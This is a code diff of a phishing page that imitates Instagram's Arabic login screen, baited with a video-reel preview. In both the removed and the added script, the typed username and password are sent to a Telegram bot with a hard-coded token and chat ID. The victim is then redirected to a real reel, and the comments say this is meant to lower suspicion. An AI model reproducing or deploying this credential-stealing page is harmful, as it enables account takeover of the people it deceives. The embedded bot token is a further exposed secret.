@@ -5,83 +5,55 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <meta property="og:title" content="Abdulaziz Shah على Instagram : ما توقعت المايك يلقط تغريد الطيور...">
-    <meta property="og:description" content="شاهد الفيديو الكامل الآن عبر تطبيق Instagram. المحتوى قد يحتوي على مشاهد حساسة.">
-    
+    <meta property="og:description" content="شاهد الفيديو الكامل الآن عبر تطبيق Instagram.">
     <meta property="og:image" content="https://scontent.cdninstagram.com/v/t51.2885-15/434524458_1123447385517373_7562846834162356541_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=18de2a&_nc_ohc=example"> 
-    
     <meta property="og:type" content="video.other">
-    <meta property="og:url" content="https://www.instagram.com/reel/DVucGpOiJms/">
     
-    <title>تسجيل الدخول • Instagram</title>
+    <title>Instagram</title>
     
     <style>
-        body { background-color: #fafafa; color: #262626; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; justify-content: center; align-items: center; }
-        .main-container { width: 100%; max-width: 350px; padding: 10px; box-sizing: border-box; }
-        .login-box { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 10px 40px; text-align: center; margin-bottom: 10px; }
-        .insta-logo { margin: 22px auto 12px; display: block; width: 175px; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 0 7px 8px; color: #262626; margin-bottom: 6px; box-sizing: border-box; font-size: 12px; }
-        input:focus { border: 1px solid #a8a8a8; outline: none; }
-        .btn-login { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 4px; padding: 5px 9px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 8px; }
-        .btn-login:disabled { background-color: #b2dffc; cursor: default; }
-        .separator { display: flex; align-items: center; text-align: center; color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 15px 0; }
+        /* تصميم ملء الشاشة بدون مربعات عائمة */
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        .wrapper { display: flex; flex-direction: column; align-items: center; width: 100%; padding-top: 40px; }
+        .insta-logo { width: 175px; margin-bottom: 35px; }
+        .form-container { width: 85%; max-width: 350px; }
+        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 12px; margin-bottom: 8px; box-sizing: border-box; font-size: 14px; }
+        .btn-login { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 5px; padding: 12px; font-weight: 600; font-size: 14px; margin-top: 10px; cursor: pointer; }
+        .separator { display: flex; align-items: center; text-align: center; color: #8e8e8e; font-size: 13px; margin: 25px 0; width: 100%; }
         .separator::before, .separator::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
-        .separator:not(:empty)::before { margin-left: 1.25em; }
-        .separator:not(:empty)::after { margin-right: 1.25em; }
-        .facebook-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 20px; }
-        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; }
-        .signup-box { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; text-align: center; font-size: 14px; }
-        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
-        .footer { position: fixed; bottom: 0; width: 100%; text-align: center; padding: 10px 0; font-size: 12px; color: #8e8e8e; background-color: #fafafa; }
+        .separator::before { margin-left: 1.5em; }
+        .separator::after { margin-right: 1.5em; }
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; margin-bottom: 20px; }
+        .footer { position: absolute; bottom: 20px; width: 100%; text-align: center; font-size: 12px; color: #8e8e8e; }
     </style>
 </head>
 <body>
 
-    <div class="main-container">
-        <div class="login-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" class="insta-logo" alt="Instagram">
-            <input type="text" id="u" placeholder="الهاتف، اسم المستخدم أو البريد الإلكتروني" oninput="checkInputs()">
-            <input type="password" id="p" placeholder="كلمة السر" oninput="checkInputs()">
-            <button class="btn-login" id="loginBtn" onclick="sendData()" disabled>تسجيل الدخول</button>
+    <div class="wrapper">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" class="insta-logo">
+        
+        <div class="form-container">
+            <input type="text" id="u" placeholder="اسم المستخدم أو الهاتف">
+            <input type="password" id="p" placeholder="كلمة السر">
+            <button class="btn-login" onclick="send()">تسجيل الدخول</button>
             
             <div class="separator">أو</div>
-            
-            <a href="#" class="facebook-login">تسجيل الدخول بحساب Facebook</a>
-            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
-        </div>
-        
-        <div class="signup-box">
-            ليس لديك حساب؟ <a href="#">تسجيل</a>
+            <a href="#" class="fb-login">تسجيل الدخول بحساب فيسبوك</a>
         </div>
     </div>
-    
-    <div class="footer">من Meta</div>
+
+    <div class="footer">من META</div>
 
     <script>
-        function checkInputs() {
+        function send() {
             const u = document.getElementById('u').value;
             const p = document.getElementById('p').value;
-            const btn = document.getElementById('loginBtn');
-            btn.disabled = !(u.length > 0 && p.length > 5);
-        }
-
-        function sendData() {
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-            
-            if(user === "" || pass === "") return;
-
-            // إرسال البيانات لبوت التليجرام الخاص بك (مع رسالة أوضح)
-            const token = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
-            const chatId = "897618292";
-            const message = `📡 صيدة جديدة من فخ الفيديو:\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
-
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-            .then(() => {
-                // تحويل الضحية للفيديو الأصلي بعد ثانية واحدة (لزيادة المصداقية)
-                setTimeout(() => {
-                    window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/";
-                }, 1000);
-            });
+            if(u && p) {
+                // بوت التليجرام الخاص بك
+                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=👤User: ${u}%0A🔑Pass: ${p}`);
+                // تحويل مباشر للفيديو الأصلي لتقليل الشك
+                setTimeout(() => { window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/"; }, 1000);
+            }
         }
     </script>
 </body>
